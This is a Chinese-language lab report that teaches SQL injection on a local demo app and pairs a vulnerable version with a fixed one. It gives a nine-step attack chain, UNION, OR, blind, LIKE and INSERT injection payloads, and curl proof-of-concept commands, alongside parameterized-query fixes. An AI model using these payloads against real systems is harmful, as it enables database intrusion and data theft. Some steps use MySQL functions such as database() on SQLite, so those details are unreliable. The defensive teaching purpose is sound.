# SQL注入漏洞 — 类型分析与修复方案报告

---

## 一、项目概述

| 项目 | 内容 |
|------|------|
| 漏洞版端口 | 5000 — `app.py` |
| 安全版端口 | 5001 — `app_fixed.py` |
| 数据库 | SQLite 3.x（漏洞版:`data/users.db`，安全版:`data/users_fixed.db`） |
| 漏洞版SQL方式 | f-string 拼接 — 存在SQL注入 |
| 安全版SQL方式 | 参数化查询 `?` 占位符 — 防止SQL注入 |
| 安全版密码存储 | bcrypt 哈希 |
| 演示注入类型 | UNION注入 / OR注入 / AND布尔盲注 / LIKE通配符 / INSERT注入 |

---

## 二、SQL注入攻击链（9步）

```
第一步：判断是否存在注入点
  输入  '         → 页面异常/报错         → 存在注入
  输入  ' OR '1'='1  → 返回全部数据       → 注入确认

第二步：判断数字型/字符型
  输入  id=2-1     → 如果等于 id=1 的结果 → 数字型
  本例为字符型（LIKE 字符串匹配）

第三步：判断闭合方式
  尝试 ', ", ')  等 → 观察报错信息
  本例闭合方式: '

第四步：判断列数
  ' ORDER BY 3--  → 正常
  ' ORDER BY 4--  → 报错 → 列数为 3 （或 4 取决于表结构）
  或使用 UNION SELECT NULL 逐次探测

第五步：查询回显位置
  ' UNION SELECT 1,2,3,4--
  页面显示的数字即为回显位置

第六步：获取数据库名
  ' UNION SELECT 1,2,database(),4--
  数据库名显示在回显位置

第七步：获取表名
  ' UNION SELECT 1,2,group_concat(tbl_name),4 FROM sqlite_master--

第八步：获取列名
  ' UNION SELECT 1,2,group_concat(name),4 FROM pragma_table_info('users')--

第九步：获取数据
  ' UNION SELECT 1,2,password,4 FROM users--
```

---

## 三、SQL注入类型详解

### 类型①：UNION注入

**原理：** 利用 `UNION SELECT` 关键字合并攻击者构造的查询结果。

**攻击Payload：**
```
搜索框:  ' UNION SELECT 1,'inj','inj@x.com','138'--
SQL:     SELECT ... WHERE username LIKE '%' UNION SELECT 1,'inj','inj@x.com','138'--%'
效果:    搜索结果中出现 "inj" 用户名
```

**列数匹配要求：** `UNION SELECT` 的列数必须与原查询一致（本例为4列）。

**修复方案：**
```python
# ❌ 漏洞代码（f-string 拼接）
sql = f"SELECT ... WHERE username LIKE '%{keyword}%'"

# ✅ 安全代码（参数化查询）
sql = "SELECT ... WHERE username LIKE ?"
c.execute(sql, (f"%{keyword}%",))
```

---

### 类型②：OR注入

**原理：** 利用 `OR '1'='1'` 构造永真条件，WHERE 条件永远成立，返回全部数据。

**攻击Payload：**
```
搜索框:  ' OR '1'='1
SQL:     SELECT ... WHERE username LIKE '%' OR '1'='1%'
效果:    返回数据库中所有用户
```

**修复方案：** 参数化查询后，`' OR '1'='1` 被当作普通文本匹配，不会触发永真条件。

---

### 类型③：AND布尔盲注

**原理：** 利用 `AND` 构造条件判断，根据页面是否返回数据推断数据库信息。

**攻击Payload：**
```
条件为真:  admin' AND '1'='1   → 返回数据（页面有结果）
条件为假:  admin' AND '1'='2   → 无数据（页面无结果）
```

**应用场景：** 当页面无直接回显位置时，通过"有/无数据"逐字符猜解数据。

**猜解过程：**
```
admin' AND length(database())=4  → 返回数据 → 库名长度为4
admin' AND substr(database(),1,1)='m' → 返回数据 → 第一个字符为'm'
admin' AND substr(database(),2,1)='a' → 返回数据 → 第二个字符为'a'
... → 最终得到 "main"
```

**修复方案：** 参数化查询使 `AND` 失去SQL语法意义。

---

### 类型④：LIKE通配符注入

**原理：** LIKE 支持 `%`（匹配任意字符）和 `_`（匹配单个字符）通配符。

**攻击Payload：**
```
%       → 返回全部用户
%a%     → 返回所有包含字母a的用户
admin_  → 返回admin开头+任意1字符的用户
```

**修复方案：**
```python
# 对通配符进行转义
keyword = keyword.replace("%", "\\%").replace("_", "\\_")
```

---

### 类型⑤：INSERT注入

**原理：** 在注册功能的字段中插入 SQL 代码，闭合 INSERT 语句。

**攻击Payload：**
```
用户名:  hacker', 'hack123', 'h@x.com', '999')--
生成SQL: INSERT INTO users VALUES ('hacker', 'hack123', 'h@x.com', '999')--', ...)
效果:    )-- 注释掉后续SQL，插入任意数据
```

**修复方案：**
```python
# ❌ 漏洞代码
sql = f"INSERT INTO users VALUES ('{username}', '{password}', ...)"

# ✅ 安全代码
sql = "INSERT INTO users VALUES (?, ?, ?, ?)"
c.execute(sql, (username, password, email, phone))
```

---

## 四、代码对比

### 搜索功能

| 维度 | 漏洞版 `app.py` | 安全版 `app_fixed.py` |
|------|-----------------|----------------------|
| SQL构建 | `f"...LIKE '%{keyword}%'"` | `"...LIKE ?"` |
| 用户输入 | 拼接为SQL代码 | 作为参数传入 |
| `' OR '1'='1` | 变为永真条件 ✅ | 当作普通文本 ❌ |
| `' UNION SELECT...` | 合并到结果 ✅ | 当作普通文本 ❌ |
| 数据库执行 | `c.execute(sql)` | `c.execute(sql, params)` |

### 注册功能

| 维度 | 漏洞版 | 安全版 |
|------|--------|--------|
| SQL构建 | `f"VALUES ('{username}')"` | `"VALUES (?)"` |
| 闭合注入 | `hacker')--` 可闭合 ✅ | 参数化无法闭合 ❌ |
| 密码存储 | 明文 | bcrypt 哈希 |

---

## 五、POC 测试命令

```bash
# 登录获取 session
CSRF=$(curl -s -c /tmp/c.txt http://localhost:5000/login | grep -oP 'name="_csrf_token" value="\K[^"]+')
curl -s -b /tmp/c.txt -c /tmp/c.txt \
  -d "username=admin&password=admin123&_csrf_token=$CSRF" \
  http://localhost:5000/login -L -o /dev/null

# POC 1：UNION 注入
curl -b /tmp/c.txt \
  "http://localhost:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj@x.com%27,%27138%27--"

# POC 2：OR 注入
curl -b /tmp/c.txt \
  "http://localhost:5000/search?keyword=%27%20OR%20%271%27%3D%271"

# POC 3：INSERT 注入（注册功能）
CSRF2=$(curl -s -c /tmp/c2.txt http://localhost:5000/register | grep -oP 'name="_csrf_token" value="\K[^"]+')
curl -b /tmp/c2.txt \
  -d "username=hacker', 'pass', 'h@x.com', '123')--&password=x&_csrf_token=$CSRF2" \
  http://localhost:5000/register
```

---

## 六、防御方案对比

| 防御措施 | 效果 | 实现成本 | 推荐度 |
|----------|------|----------|:------:|
| 参数化查询 `?` | 彻底杜绝注入 | 低 | ⭐⭐⭐⭐⭐ |
| 输入过滤/转义 | 可能被绕过 | 中 | ⭐⭐⭐ |
| WAF | 可被绕过 | 高 | ⭐⭐ |
| ORM框架 | 内置防护 | 低 | ⭐⭐⭐⭐⭐ |
| 最小权限原则 | 减少损失 | 低 | ⭐⭐⭐⭐ |

---

## 七、修复铁律

```
┌──────────────────────────────────────────┐
│              SQL注入防御铁律              │
│                                          │
│  ❌ 永远不要用 f-string 拼接 SQL         │
│  ❌ 永远不要相信用户输入                  │
│  ✅ 始终使用参数化查询 ? 占位符          │
│  ✅ 最小权限原则（不用 root 连库）       │
│  ✅ 错误信息不暴露给用户                  │
└──────────────────────────────────────────┘
```

---

*报告生成日期：2026-07-08*
*项目地址：https://github.com/na-asuka/second-day*
